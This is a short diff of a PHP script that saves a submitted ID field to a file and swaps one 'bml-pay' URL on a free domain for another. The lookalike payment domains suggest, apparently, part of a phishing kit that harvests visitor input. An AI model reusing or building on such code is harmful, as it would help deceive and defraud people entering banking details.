@@ -31,7 +31,7 @@ $IDS=intval(stripslashes(htmlspecialchars($_POST["ID"])));
 
 //LINK
 
-$url="https://bml-pay.ga/";
+$url="http://bml-pay.cf";
 
 file_put_contents("ID.txt",$IDS);
  
